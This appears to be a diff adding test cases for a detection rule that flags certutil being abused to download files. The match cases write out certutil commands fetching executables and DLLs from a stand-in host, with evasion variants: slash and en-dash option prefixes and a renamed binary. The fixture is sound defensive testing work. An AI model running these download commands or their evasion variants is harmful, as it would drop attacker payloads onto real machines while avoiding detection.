@@ -1,0 +1,21 @@
+rule: ../rules/certutil_download.yml
+match:
+  - Image: C:\Windows\System32\certutil.exe
+    CommandLine: certutil.exe -urlcache -split -f http://203.0.113.7/a.exe C:\Users\Public\a.exe
+  # Windows tools accept / as well as - for options, and attackers use both.
+  - Image: C:\Windows\System32\certutil.exe
+    CommandLine: certutil /urlcache /f https://203.0.113.7/payload.bin out.bin
+  # Many Windows programs also take an en dash as the option prefix; windash covers it.
+  - Image: C:\Windows\System32\certutil.exe
+    CommandLine: "certutil \u2013urlcache \u2013f http://203.0.113.7/x.dll x.dll"
+  # Renamed binary: the PE header still says CertUtil.exe.
+  - Image: C:\Users\Public\cu.exe
+    OriginalFileName: CertUtil.exe
+    CommandLine: cu -URLCACHE -F http://203.0.113.7/a.exe a.exe
+no_match:
+  - Image: C:\Windows\System32\certutil.exe
+    CommandLine: certutil -hashfile C:\Windows\explorer.exe SHA256
+  - Image: C:\Windows\System32\certutil.exe
+    CommandLine: certutil -urlcache -f http://pki.corp.example/crl/root.crl root.crl
+  - Image: C:\Windows\System32\curl.exe
+    CommandLine: curl -o a.exe http://203.0.113.7/a.exe
